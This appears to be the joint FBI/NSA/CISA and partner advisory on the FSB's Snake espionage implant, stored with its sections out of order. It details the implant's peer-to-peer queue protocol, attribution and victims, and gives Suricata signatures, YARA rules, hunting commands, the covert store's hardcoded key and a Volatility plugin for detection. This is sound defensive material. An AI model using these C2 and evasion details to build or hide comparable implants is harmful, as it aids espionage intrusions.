(1), (2): During Passive operations, the Node randomly chooses a host from amongst its stored communication channels and will beacon out to it with a Queue Read command (Hop Point 1 in this case). The Item Type for these beacons will be one greater than the Item Type of the last command received by the Node, indicating in this example that a command of Item Type 0x08 was the last command that was read in by the Node during Passive operations. This Node will continue to beacon with Item Type 0x09 until it receives a command, via Passive operations, with an Item Type of 0x09 or greater. The lines are dotted for (1) and (2) as this activity will be repeated at random intervals until a successful Queue Read occurs.
(3), (4): In these steps, the operator uses a Queue Write command to write a command to Hop Point that is ultimately intended for the Node. The Item Type of the command being written to Hop Point 1 is assigned 0x20 (for this example). Note that the path of this command, its execution, and its results making it back to the operator can be tracked via the red text.
(5), (6): The Node continues to beacon out looking for commands to read in (5). The return (6) is successful, and the command written by the operator to Hop Point 1 (3) is read in by the Node, then deleted from Hop Point 1.
(7), (8): The Node attempts another Queue Read to Hop Point 1, however now the Item Type is set to 0x21, one greater than the command that was just read in by the Node at (5) and (6). This returns an error as Hop Point 1 has nothing else for the Node to read in, indicating to the Node that everything at Hop Point 1 was read.
(9), (10): At this point, the Node has executed the command it read in at (5) and (6) and is attempting to send back the results. The Node randomly selects another host from its stored communication channels, Hop Point 2 in this case, and sends out a 0xb command to make sure that the Item Type 0x20, the Item Type of the command it executed, does not already exist within the Queue of Hop Point 2. If it receives an error, there is no Item with Item Type 0x20 on Hop Point 2, and the Node can proceed to send the command results.
(11), (12): Here the data from the executed command is written to Hop Point 2 with Item Type 0x20 into its 0x1 Container with a 0xc command, the Item Type the command was initially given at creation (3).
(13), (14): The Node continues its normal beaconing routine again as seen in (1) and (2), searching for Item Type 0x21, one greater than the Item Type of the most recently executed command. As in (1) and (2), the lines here are dotted to denote that this process will repeat until there was a successful beacon as in (5) and (6).
(15-22): These steps show how the operator retrieves the resulting data that was written to Hop Point 2. The Queue Enumerate command (15) lists the contents of Hop Point 2’s 0x1 Container, showing the data written by the Node (11). This data is identifiable by its Item Type, namely 0x20. The Queue Read command (17) reads in the Item that was found in Hop Point 2’s Container. The Queue Read command that follows (19) is asking if there is any data left. In this case, the entirety of the data was read with the first Queue Read (17, 18). Therefore, the error returned from second Queue Read command (20) lets the operator know all of the data from Item Type 0x20 was read and there is nothing further. A Queue Delete command (21) follows and is sent to delete the item with Item Type 0x20 from Hop Point 2.
The subsequent Queue Read, Queue Read, and Queue Delete commands (17-21) are denoted with dashed lines to indicate that this sequence of commands is repeated for all items returned from the Queue Enumerate command (15).

MITIGATIONS
A number of complementary detection techniques effectively identify some of the more recent variants of Snake. However, as described above, Snake is purpose-built to avoid large-scale detection. Below is a discussion of the advantages and disadvantages of various detection methodologies available for Snake.
Note that some of the techniques identified in this section can affect the availability or stability of a system. Defenders should follow organizational policies and incident response best practices to minimize the risk to operations while hunting for Snake.
Network-Based Detection
Network Intrusion Detection Systems (NIDS) can feasibly identify some of the more recent variants of Snake and its custom network protocols as detailed above.
Advantages: High-confidence, large-scale (network-wide) detection of custom Snake communication protocols.
Disadvantages: Low visibility of Snake implant operations and encrypted data in transit. There is some potential for false positives in the Snake http, http2, and tcp signatures. Snake operators can easily change network-based signatures.
Snake http
Snake client-to-server http and http2 traffic is contained within an arbitrary HTTP header field. The header field value for http begins with 10 pure alphanumeric characters, followed by base64 encoding of 8 bytes, which yields exactly 11 valid base64 characters plus one base64 padding character.
      ^[0-9A-Za-z]{10}[0-9A-Za-z/\+]{11}=
The following two Suricata rules will detect the traffic described:
alert http any any -> any any (msg: ""http rule (Cookie)"";\    pcre:""/[0-9A-Za-z]{10}[0-9A-Za-z\/\+]{11}=/C"";\    flow: established, to_server;\    sid: 7; rev: 1;) alert http any any -> any any (msg: ""http rule (Other Header)"";\    pcre:""/[0-9A-Za-z]{10}[0-9A-Za-z\/\+]{11}=/H"";\    flow: established, to_server;\    sid: 8; rev: 1;)
Snake http2
The header field value for http2 begins with 22 pure alphanumeric characters (base62 with non-extraneous characters), followed by the base62 encoding of at least 8 bytes, which must comprise at least 11 base62 characters with the four extraneous characters allowed. The actual requirement is stricter than this expression, since the total number of non-extraneous characters alone must equal or exceed 11; however, it is not possible to encode that aspect into a regular language.
      ^[0-9A-Za-z]{22}[0-9A-Za-z/;_=]{11}
The following two Suricata rules will detect the traffic described:
alert http any any -> any any (msg: ""http2 rule (Cookie)"";\    pcre:""/[0-9A-Za-z]{22}[0-9A-Za-z\/_=\;]{11}/C"";\    flow: established, to_server;\    sid: 9; rev: 1;) alert http any any -> any any (msg: ""http2 rule (Other Header)"";\    pcre:""/[0-9A-Za-z]{22}[0-9A-Za-z\/_=\;]{11}/H"";\    flow: established, to_server;\    sid: 10; rev: 1;)
Snake tcp
The client-to-server communication for tcp must begin with the ustart, which is not captured in this signature set. Immediately following the ustart, the next client-to-server communication must be the big-endian 32-bit unsigned integer 8 followed by any 8 bytes of data. The next communication must also be client-to-server, and it must comprise the big-endian 32-bit unsigned integer 4 followed by any 4 bytes of data. The next two communications must be server-to-client, comprising the integer 8 followed by 8 bytes of data and the integer 4 followed by 4 bytes of data.
The following six Suricata rules will, in conjunction, detect traffic of the form described:
alert tcp any any -> any any (msg: ""tcp rule"";\    content: ""|00 00 00 08|""; startswith; dsize: 12;\    flow: established, to_server; flowbits: set, a8; flowbits: noalert;\    sid: 1; rev: 1;) alert tcp any any -> any any (msg: ""tcp rule"";\    content: ""|00 00 00 04|""; startswith; dsize:8;\    flow: established, to_server; flowbits: isset, a8; flowbits: unset, a8;\    flowbits: set, a4; flowbits: noalert;\    sid: 2; rev: 1;) alert tcp any any -> any any (msg: ""tcp rule"";\    content: ""|00 00 00 08|""; startswith; dsize: 4;\    flow: established, to_client; flowbits: isset, a4; flowbits: unset, a4;\    flowbits: set, b81; flowbits: noalert;\    sid: 3; rev: 1;) alert tcp any any -> any any (msg: ""tcp rule"";\    dsize: 8; flow: established, to_client; flowbits: isset, b81;\    flowbits: unset, b81; flowbits: set, b8; flowbits: noalert;\    sid: 4; rev: 1;) alert tcp any any -> any any (msg: ""tcp rule"";\    content: ""|00 00 00 04|""; startswith; dsize: 4;\    flow: established, to_client; flowbits: isset, b8; flowbits: unset, b8;\    flowbits: set, b41; flowbits: noalert;\    sid: 5; rev: 1;) alert tcp any any -> any any (msg: ""tcp rule"";\    dsize: 4; flow: established, to_client; flowbits: isset, b41;\    flowbits: unset, b41;\    sid: 6; rev: 1;)
Host-Based Detection
Advantages: High confidence based on totality of positive hits for host-based artifacts.
Disadvantages: Many of the artifacts on the host are easily shifted to exist in a different location or with a different name. As the files are fully encrypted, accurately identifying these files is difficult.
Covert Store Detection
The Snake covert store comprises a file-backed NTFS (usually) or FAT-16 (rarely) filesystem. The filesystem is encrypted with CAST-128 in CBC mode. The encryption key can be either statically hardcoded or dynamically stored in a specified Windows registry location. The IV is 8 bytes, since CAST-128 has an 8-byte block length. The first byte of the IV for any 512-byte block of the covert store is the 0-indexed block number. The remaining bytes of the IV are the corresponding bytes of the key, meaning that bytes at 0-indexed indices 1 through 7 of the IV are the bytes at 0-indexed indices 1 through 7 of the key.
When statically hardcoded, the encryption key has the following constant value: ​​​​​​     A1 D2 10 B7 60 5E DA 0F A1 65 AF EF 79 C3 66 FA
When stored in the Windows registry, the encryption key is the classname associated with the following key:
      SECURITY\Policy\Secrets\n
The following initial 8-byte sequences are known to be used by NTFS or FAT-16 filesystems as observed:
      EB 52 90 4E 54 46 53 20      EB 5B 90 4E 54 46 53 20      EB 3C 90 4D 53 44 4F 53      EB 00 00 00 00 00 00 00
For tool development, the following test vector illustrates the encryption of the first given header above (EB 52 90 …) using CAST-128 with the default key shown above and the IV constructed as described, given this header occurs at the beginning of the first 512-byte block of the covert store.
      Plaintext:      EB 52 90 4E 54 46 53 20      Key:              A1 D2 10 B7 60 5E DA 0F A1 65 AF EF 79 C3 66 FA      IV:                 00 D2 10 B7 60 5E DA 0F      Ciphertext:   C2 C7 F4 CA F7 DA 3A C8
By encrypting each possible initial filesystem byte sequence with CAST-128 using the key obtained from the registry—or the default encryption key if the registry entry does not exist—and searching for any file with a size that is an even multiple of 220, it is possible to efficiently detect Snake covert stores. Validation can be performed by decrypting the entire file using the outlined methodology and then verifying that it comprises an NTFS or FAT-16 filesystem.
Other On-Disk Artifact Detection
Registry Blob
The registry blob is generally found at the location listed below. In case it is not present at its typical location, the registry blob can be found by searching the full registry for a value of at least 0x1000 bytes in size and entropy of at least 7.9.
      Typical Name: Unknown (RegBlob)      Typical Path: HKLM\SOFTWARE\Classes\.wav\OpenWithProgIds      Characteristics: High Entropy
Queue File
      Typical Name: < RANDOM_GUID >.<RANDOM_GUID>.crmlog      Typical Path: %windows\registration\      Unique Characteristics: High Entropy, file attributes of hidden, system, and archive      Role: Snake Queue File
The Snake Queue File generally has a predictable path and filename structure, in addition to being high entropy. The Snake Queue File can be located by scanning all files in the typical queue path with filenames matching a regular expression that captures the typical naming convention. Files meeting these criteria should be scanned for high entropy, which is performed by the Yara rule below:
rule HighEntropy {    meta:        description = ""entropy rule""    condition:        math.entropy(0, filesize) >= 7.0 }
The following UNIX find command will scan files with names matching the GUID-based convention (note that the HighEntropy yara rule is assumed to be contained in a file named “1.yar”):
find /PATH/TO/WINDOWS_DIR -type f -regextype posix-egrep -iregex \    '.*\/registration/(\{[0-9A-F]{8}\-([0-9A-F]{4}\-){3}[0-9A-F]{12}\}\.){2}crmlog' \     -exec yara 1.yar {} \;
The following PowerShell command does the same:
Get-ChildItem -Recurse -File -Path %WINDOWS% | Where-Object {  $_.FullName -match  '(?i)/registration/(\{[0-9A-F]{8}\-([0-9A-F]{4}\-){3}[0-9A-F]{12}\}\.){2}crmlog$' } | ForEach-Object {  yara 1.yar $_.FullName }
Comadmin
      Typical Name: comadmin.dat      Typical Path: %windows%\system32\Com      Unique Characteristics: High Entropy      Role: Houses Snake’s kernel driver and the driver’s loader
The Snake Comadmin file can be found using analogous techniques to that presented above for locating the Snake Queue File. The following UNIX find command will do so:
find /PATH/TO/WINDOWS -type f -regextype posix-egrep -iregex \    '.*\/system32/Com/comadmin\.dat' \     -exec yara 1.yar {} \;
The following PowerShell command does the same:
Get-ChildItem -Recurse -File -Path %WINDOWS% | Where-Object {    $_.FullName -match '(?i)/system32/Com/comadmin\.dat$' } | ForEach-Object {    yara 1.yar $_.FullName }
Werfault
Typical Name: Werfault.exeTypical Path: %windows%\WinSxS\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a0502\Unique Characteristics: Icon is different than that of a valid Windows Werfault.exe fileRole: Persistence mechanism
The Snake Werfault.exe file has non-standard icon sizes, which form the basis of the Yara rule below. This rule should be run on all files in the typical path, specifically the %Windows%\WinSxS directory.
rule PeIconSizes {    meta:        description = ""werfault rule""    condition:        pe.is_pe        and        for any rsrc in pe.resources:            (rsrc.type == pe.RESOURCE_TYPE_ICON and rsrc.length == 3240)        and        for any rsrc in pe.resources:            (rsrc.type == pe.RESOURCE_TYPE_ICON and rsrc.length == 1384)        and        for any rsrc in pe.resources:            (rsrc.type == pe.RESOURCE_TYPE_ICON and rsrc.length == 7336) }
Memory Analysis
Advantages: High confidence as memory provides the greatest level of visibility into Snake’s behaviors and artifacts.
Disadvantages: Potential impact on system stability, difficult scalability.
Capturing and analyzing the memory of a system will be the most effective approach in detecting Snake because it bypasses many of the behaviors that Snake employs to hide itself. With a memory analysis tool, such as Volatility, detection of a Snake compromise may be possible.Snake’s principal user mode component is injected into a chosen process via a single allocation of PAGE_EXECUTE_READWRITE memory. The starting offset is generally 0x20000000, however the module does allow for relocation if needed. Additionally, since the user mode component is not obfuscated in any way, a valid PE header can be located at the beginning of the allocated memory region. Further validation can be performed by confirming the presence of strings known to exist in the user mode component also within the memory region. A plugin compatible with Volatility3 which can scan all processes on a system using this method is provided in the Appendix. A screenshot showing the results of the plugin successfully detecting Snake is displayed below.

 


PREVENTION
Note that the mitigations that follow are not meant to protect against the initial access vector and are only designed to prevent Snake’s persistence and hiding techniques.
Change Credentials and Apply Updates
System owners who are believed to be compromised by Snake are advised to change their credentials immediately (from a non-compromised system) and to not use any type of passwords similar to those used before. Snake employs a keylogger functionality that routinely returns logs back to FSB operators. Changing passwords and usernames to values which cannot be brute forced or guessed based on old passwords is recommended.
System owners are advised to apply updates to their Operating Systems. Modern versions of Windows, Linux, and MacOS make it much harder for adversaries to operate in the kernel space. This will make it much harder for FSB actors to load Snake’s kernel driver on the target system.
Execute Organizational Incident Response Plan
If system owners receive detection signatures of Snake implant activity or have other indicators of compromise that are associated with FSB actors using Snake, the impacted organization should immediately initiate their documented incident response plan.
We recommend implementing the following Cross-Sector Cybersecurity Performance Goals (CPGs) to help defend against FSB actors using Snake, or mitigate negative impacts post-compromise:
CPG 2.A: Changing Default Passwords will prevent FSB actors from compromising default credentials to gain initial access or move laterally within a network.
CPG 2.B: Requiring Minimum Password Strength across an organization will prevent FSB actors from being able to successfully conduct password spraying or cracking operations. 
CPG 2.C: Requiring Unique Credentials will prevent FSB actors from compromising valid accounts through password spraying or brute force. 
CPG 2.E Separating User and Privileged Accounts will make it harder for FSB actors to gain access to administrator credentials.
CPG 2.F. Network Segmentation to deny all connections by default unless explicitly required for specific system functionality, and ensure all incoming communication is going through a properly configured firewall.
CPG 2.H Implementing Phishing Resistant MFA adds an additional layer of security even when account credentials are compromised and can mitigate a variety of attacks towards valid accounts, to include brute forcing passwords and exploiting external remote services software.
CPG 4.C. Deploy Security.txt Files to ensure all public facing web domains have a security.txt file that conforms to the recommendations in RFC 9118.
APPENDIX
Partnership
This advisory was developed as a joint effort by an international partnership of multiple agencies in furtherance of the respective cybersecurity missions of each of the partner agencies, including our responsibilities to develop and issue cybersecurity specifications and mitigations. This partnership includes the following organizations:

Federal Bureau of Investigation
National Security Agency
Cybersecurity and Infrastructure Security Agency
Cyber National Mission Force
The United Kingdom’s National Cyber Security Centre
Canadian Centre for Cyber Security
Communications Security Establishment
Australian Cyber Security Centre
New Zealand National Cyber Security Centre

Collectively, we use a variety of sources, methods, and partnerships to acquire information about foreign cyber threats. This advisory contains the information we have concluded can be publicly released, consistent with the protection of sources and methods and the public interest.
Disclaimer
The information in this report is being provided “as is” for informational purposes only. We do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by co-authors. 
MITRE ATT&CK Techniques
This advisory uses the MITRE ATT&CK® for Enterprise framework, version 13. See MITRE ATT&CK for Enterprise for all referenced tactics and techniques. MITRE and ATT&CK are registered trademarks of The MITRE Corporation. This report references the following MITRE ATT&CK techniques.



Technique Title
ID
Use


Network Connection Enumeration
T0840
Adversaries may perform network connection enumeration to discover information about device communication patterns.


Data Obfuscation
T1001
Adversaries may obfuscate command and control traffic to make it more difficult to detect.


Protocol Impersonation
T1001.003
Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts.


OS Credential Dumping
T1003
Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software.


Rootkit
T1014
Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components.


Obfuscated Files or Information
T1027
Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.


Software Packing
T1027.002
Adversaries may perform software packing or virtual machine software protection to conceal their code.


Masquerading
T1036
Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools.


Network Sniffing
T1040
Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network.


Network Service Discovery
T1046
Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation.


Dynamic-link Library Injection
T1055.001
Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges.


Keylogging
T1056.001
Adversaries may log user keystrokes to intercept credentials as the user types them.


PowerShell
T1059.001
Adversaries may abuse PowerShell commands and scripts for execution.


Application Layer Protocol
T1071
Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic.


Web Protocols
T1071.001
Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic.


Mail Protocols
T1071.003
Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic.


DNS
T1071.004
Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic.


Data Staged
T1074
Adversaries may stage collected data in a central location or directory prior to Exfiltration.


Valid Accounts
T1078
Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.


File and Directory Discovery
T1083
Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system.


Multi-hop Proxy
T1090.003
To disguise the source of malicious traffic, adversaries may chain together multiple proxies.


Non-Application Layer Protocol
T1095
Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network.


Multi-Stage Channels
T1104
Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions.


Native API
T1106
Adversaries may interact with the native OS application programming interface (API) to execute behaviors.


Modify Registry
T1112
Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.


Automated Collection
T1119
Once established within a system or network, an adversary may use automated techniques for collecting internal data.


Data Encoding
T1132
Adversaries may encode data to make the content of command and control traffic more difficult to detect.


Non-Standard Encoding
T1132.002
Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect.


Network Share Discovery
T1135
Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement.


Deobfuscate/Decode Files or Information
T1140
Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis.


Exploit Public-Facing Application
T1190
Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network.


Domain Trust Discovery
T1482
Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments.


Installer Packages
T1546.016
Adversaries may establish persistence and elevate privileges by using an installer to trigger the execution of malicious content.


Dynamic Linker Hijacking
T1547.006
Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries.


Inter-Process Communication
T1559
Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution.


Archive Collected Data
T1560.003
An adversary may compress and/or encrypt data that is collected prior to exfiltration.


Hide Artifacts
T1564
Adversaries may attempt to hide artifacts associated with their behaviors to evade detection.


Service Execution
T1569.002
Adversaries may abuse the Windows service control manager to execute malicious commands or payloads.


Lateral Tool Transfer
T1570
Adversaries may transfer tools or other files between systems in a compromised environment.


Protocol Tunneling
T1572
Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems.


Encrypted Channel
T1573
Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.


Symmetric Cryptography
T1573.001
Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.


Asymmetric Cryptography
T1573.002
Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.


DLL Side-Loading
T1574.002
Adversaries may execute their own malicious payloads by side-loading DLLs.


Compromise Infrastructure
T1584
Adversaries may compromise third-party infrastructure that can be used during targeting.


Malware
T1587.001
Adversaries may develop malware and malware components that can be used during targeting.


Obtain Capabilities
T1588
Adversaries may buy and/or steal capabilities that can be used during targeting.


Stage Capabilities
T1608
Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting.


Deploy Container
T1610
Adversaries may deploy a container into an environment to facilitate execution or evade defenses.



Volatility Plugin
The following plugin for the Volatility memory analysis framework will scan all processes on the system until it finds the Snake user mode component injected into a process. If found, the plugin will list both the injected process and the virtual memory address at which the Snake user mode component is loaded.
# This plugin to identify the injected usermode component of Snake is based # on the malfind plugin released with Volatility3 # # This file is Copyright 2019 Volatility Foundation and licensed under the # Volatility Software License 1.0 # which is available at https://www.volatilityfoundation.org/license/vsl-v1.0 import logging from typing import Iterable, Tuple from volatility3.framework import interfaces, symbols, exceptions, renderers from volatility3.framework.configuration import requirements from volatility3.framework.objects import utility from volatility3.framework.renderers import format_hints from volatility3.plugins.windows import pslist, vadinfo vollog = logging.getLogger(__name__) class snake(interfaces.plugins.PluginInterface):    _required_framework_version = (2, 4, 0)        @classmethod    def get_requirements(cls):        return [            requirements.ModuleRequirement(name = 'kernel',            description = 'Windows kernel',            architectures = [""Intel32"", ""Intel64""]),            requirements.VersionRequirement(name = 'pslist',            component = pslist.PsList, version = (2, 0, 0)),            requirements.VersionRequirement(name = 'vadinfo',            component = vadinfo.VadInfo, version = (2, 0, 0))]    @classmethod    def list_injections(            cls, context: interfaces.context.ContextInterface,            kernel_layer_name: str, symbol_table: str,            proc: interfaces.objects.ObjectInterface) -> Iterable[            Tuple[interfaces.objects.ObjectInterface, bytes]]:        proc_id = ""Unknown""        try:            proc_id = proc.UniqueProcessId            proc_layer_name = proc.add_process_layer()        except exceptions.InvalidAddressException as excp:            vollog.debug(""Process {}: invalid address {} in layer {}"".            format(proc_id, excp.invalid_address, excp.layer_name))            return        proc_layer = context.layers[proc_layer_name]        for vad in proc.get_vad_root().traverse():            protection_string = vad.get_protection(vadinfo.VadInfo.            protect_values(context, kernel_layer_name, symbol_table),            vadinfo.winnt_protections)            if not ""PAGE_EXECUTE_READWRITE"" in protection_string:                continue            if (vad.get_private_memory() == 1                    and vad.get_tag() == ""VadS"") or (vad.get_private_memory()                    == 0 and protection_string !=                    ""PAGE_EXECUTE_WRITECOPY""):                data = proc_layer.read(vad.get_start(),                vad.get_size(), pad = True)                if data.find(b'\x4d\x5a') != 0:                    continue                yield vad, data    def _generator(self, procs):        kernel = self.context.modules[self.config['kernel']]        is_32bit_arch = not symbols.symbol_table_is_64bit(self.context,        kernel.symbol_table_name)        for proc in procs:            process_name = utility.array_to_string(proc.ImageFileName)            for vad, data in self.list_injections(self.context,            kernel.layer_name, kernel.symbol_table_name, proc):                strings_to_find = [b'\x25\x73\x23\x31',b'\x25\x73\x23\x32',                b'\x25\x73\x23\x33',b'\x25\x73\x23\x34',                b'\x2e\x74\x6d\x70', b'\x2e\x73\x61\x76',                b'\x2e\x75\x70\x64']                if not all(stringToFind in data for                stringToFind in strings_to_find):                    continue                yield (0, (proc.UniqueProcessId, process_name,                format_hints.Hex(vad.get_start()),                           format_hints.Hex(vad.get_size()),                           vad.get_protection(                               vadinfo.VadInfo.protect_values(self.context,                kernel.layer_name, kernel.symbol_table_name),                vadinfo.winnt_protections)))                return    def run(self):        kernel = self.context.modules[self.config['kernel']]        return renderers.TreeGrid([(""PID"", int), (""Process"", str),        (""Address"", format_hints.Hex), (""Length"", format_hints.Hex),        (""Protection"", str)], self._generator(pslist.PsList.list_processes(        context = self.context, layer_name = kernel.layer_name,          symbol_table = kernel.symbol_table_name)))
 
 






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1083', 'T1573.002', 'T1560.003', 'T1132.002', 'T1569.002', 'T1001', 'T1573.001', 'T1040', 'T1482', 'T1573', 'T1564', 'T1014', 'T1190', 'T1572', 'T1112', 'T1559', 'T1608', 'T1140', 'T1132', 'T1055.001', 'T1546.016', 'T1027', 'T1078', 'T1135', 'T1584', 'T1003', 'T1001.003', 'T1056.001', 'T1046', 'T1071.004', 'T1547.006', 'T1570', 'T1588', 'T1104', 'T1071.003', 'T1574.002', 'T1071', 'T1059.001', 'T1027.002', 'T1074', 'T1610', 'T1071.001', 'T1587.001', 'T1095', 'T1106', 'T0840', 'T1036', 'T1090.003', 'T1119'}","



SUMMARY
The Snake implant is considered the most sophisticated cyber espionage tool designed and used by Center 16 of Russia’s Federal Security Service (FSB) for long-term intelligence collection on sensitive targets. To conduct operations using this tool, the FSB created a covert peer-to-peer (P2P) network of numerous Snake-infected computers worldwide. Many systems in this P2P network serve as relay nodes which route disguised operational traffic to and from Snake implants on the FSB’s ultimate targets. Snake’s custom communications protocols employ encryption and fragmentation for confidentiality and are designed to hamper detection and collection efforts.
We have identified Snake infrastructure in over 50 countries across North America, South America, Europe, Africa, Asia, and Australia, to include the United States and Russia itself. Although Snake uses infrastructure across all industries, its targeting is purposeful and tactical in nature. Globally, the FSB has used Snake to collect sensitive intelligence from high-priority targets, such as government networks, research facilities, and journalists. As one example, FSB actors used Snake to access and exfiltrate sensitive international relations documents, as well as other diplomatic communications, from a victim in a North Atlantic Treaty Organization (NATO) country. Within the United States, the FSB has victimized industries including education, small businesses, and media organizations, as well as critical infrastructure sectors including government facilities, financial services, critical manufacturing, and communications.
This Cybersecurity Advisory (CSA) provides background on Snake’s attribution to the FSB and detailed technical descriptions of the implant’s host architecture and network communications. This CSA also addresses a recent Snake variant that has not yet been widely disclosed. The technical information and mitigation recommendations in this CSA are provided to assist network defenders in detecting Snake and associated activity. For more information on FSB and Russian state-sponsored cyber activity, please see the joint advisory Russian State-Sponsored and Criminal Cyber Threats to Critical Infrastructure and CISA’s Russia Cyber Threat Overview and Advisories webpage.
Download the PDF version of this report:


Hunting Russian Intelligence “Snake” Malware
(PDF,       4.11 MB
  )


INTRODUCTION
What is Snake?
We consider Snake to be the most sophisticated cyber espionage tool in the FSB’s arsenal. The sophistication of Snake stems from three principal areas. First, Snake employs means to achieve a rare level of stealth in its host components and network communications. Second, Snake’s internal technical architecture allows for easy incorporation of new or replacement components. This design also facilitates the development and interoperability of Snake instances running on different host operating systems. We have observed interoperable Snake implants for Windows, MacOS, and Linux operating systems. Lastly, Snake demonstrates careful software engineering design and implementation, with the implant containing surprisingly few bugs given its complexity.
Following open source reporting by cybersecurity and threat intelligence companies on Snake tactics, techniques, and procedures (TTPs), the FSB implemented new techniques to evade detection. The modifications to the implant enhanced challenges in identifying and collecting Snake and related artifacts, directly hampering detection from both host- and network-based defensive tools.
The effectiveness of this type of cyber espionage implant depends entirely on its long-term stealth, since the objective of an extended espionage operation involves remaining on the target for months or years to provide consistent access to important intelligence. The uniquely sophisticated aspects of Snake represent significant effort by the FSB over many years to enable this type of covert access.
Background
The FSB began developing Snake as “Uroburos” in late 2003. Development of the initial versions of the implant appeared to be completed around early 2004, with cyber operations first conducted using the implant shortly thereafter. The name Uroburos is appropriate, as the FSB cycled it through nearly constant stages of upgrade and redevelopment, even after public disclosures, instead of abandoning it. The name appears throughout early versions of the code, and the FSB developers also left other unique strings, including “Ur0bUr()sGoTyOu#”, which have publicly come back to haunt them.
Unique features in early versions of Uroburos included a low resolution image of a portion of a historical illustration of an uroboros by the German philosopher and theologian Jakob Böhme. One approach to a tertiary backdoor used this image as the key. The same image had also been embedded in other Snake-related components. The image, blown up to a higher resolution, is shown below.

 


In addition, early FSB developers of the Snake implant left portions of unique code throughout the implant which reveal inside jokes, personal interests, and taunts directed at security researchers. For instance, the “Ur0bUr()sGoTyOu#” string referenced above was replaced with “gLASs D1cK” in 2014 following some of the public cybersecurity reporting.
Attribution
We attribute Snake operations to a known unit within Center 16 of the FSB.  This unit more broadly operates the numerous elements of the Turla  toolset, and has subunits spread throughout Russia in a reflection of historical KGB signals intelligence operations in the Soviet Union. Snake has been a core component of this unit’s operations for almost as long as Center 16 has been part of the FSB.  The extensive influence of Snake across the Turla toolset demonstrates its impact on practically every aspect of the unit’s modern era of cyber operations.
Daily operations using Snake have been carried out from an FSB facility in Ryazan, Russia, with an increase in Snake activity during FSB working hours in Ryazan, approximately 7:00 AM to 8:00 PM, Moscow Standard Time (GMT+3). The main developers were Ryazan-based FSB officers known by monikers included in the code of some versions of Snake. In addition to developing Snake, Ryazan-based FSB officers used it to conduct worldwide operations; these operations were different from others launched from Moscow or other FSB sites based on infrastructure and techniques.
While the development and re-tooling of Snake has historically been done by Ryazan-based FSB officers, Snake operations were also launched from an FSB Center 16-occupied building in Moscow. Our investigations have identified examples of FSB operators using Snake to its full potential, as well as FSB operators who appeared to be unfamiliar with Snake’s more advanced capabilities. These observations serve to illustrate the difficulty in using such an advanced toolset across the various geographically dispersed teams comprising this unit within FSB Center 16.
We have been collectively investigating Snake and Snake-related tools for almost 20 years, as well as other operations by this unit since the 1990s. During that time, the FSB has used Snake in many different operations, and they have demonstrated the value placed in this tool by making numerous adjustments and revisions to keep it viable after repeated public disclosures and other mitigations. Snake’s code and multiple Snake-related tools have been either a starting point or a key influence factor for a diverse range of other highly prolific implants and operational tools in the Turla family. Most notably, this has included Carbon (aka Cobra)—derived from Snake’s code base—and the similarly Snake-adjacent implant Chinch (currently known in open sources as ComRAT).
Victimization
We have identified Snake infrastructure in over 50 countries across North America, South America, Europe, Africa, Asia, and Australia, to include the United States and Russia itself. Although Snake leverages infrastructure across all industries, its targeting is purposeful and tactical in nature. For instance, if an infected system did not respond to Snake communications, the FSB actors would strategically re-infect it within days. Globally, the FSB has used Snake to collect sensitive intelligence from high priority targets, such as government networks, research facilities, and journalists. As one example, FSB actors used Snake to access and exfiltrate sensitive international relations documents, as well as other diplomatic communications, from a victim in a NATO country. Within the United States, the FSB has victimized industries including education, small businesses, and media organizations, as well as critical infrastructure sectors including government facilities, financial services, critical manufacturing, and communications.
Other Tools and TTPs Employed with Snake
The FSB typically deploys Snake to external-facing infrastructure nodes on a network, and from there uses other tools and TTPs on the internal network to conduct additional exploitation operations. Upon gaining and cementing ingress into a target network, the FSB typically enumerates the network and works to obtain administrator credentials and access domain controllers. A wide array of mechanisms has been employed to gather user and administrator credentials in order to expand laterally across the network, to include keyloggers, network sniffers, and open source tools. 
